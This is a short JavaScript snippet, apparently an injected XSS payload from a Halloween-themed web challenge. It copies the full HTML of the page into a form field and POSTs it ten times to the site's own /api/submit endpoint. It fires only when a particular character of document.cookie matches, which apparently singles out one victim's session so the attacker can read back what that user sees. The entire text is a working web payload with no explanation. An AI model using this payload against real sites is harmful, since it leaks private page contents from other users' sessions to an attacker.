

var pbody = JSON.stringify({"halloween_name":document.body.innerHTML,"email":"asd@asd.com","costume_type":"spellcaster","trick_or_treat":"treats"});
function pst(){fetch('/api/submit', {method: 'POST',headers:{'Content-Type':'application/json'}, body: pbody})}
var bi=0; function bk(){ for (bi;bi<10;bi++){ pst() }}

if (document.cookie[24] == ";") bk()
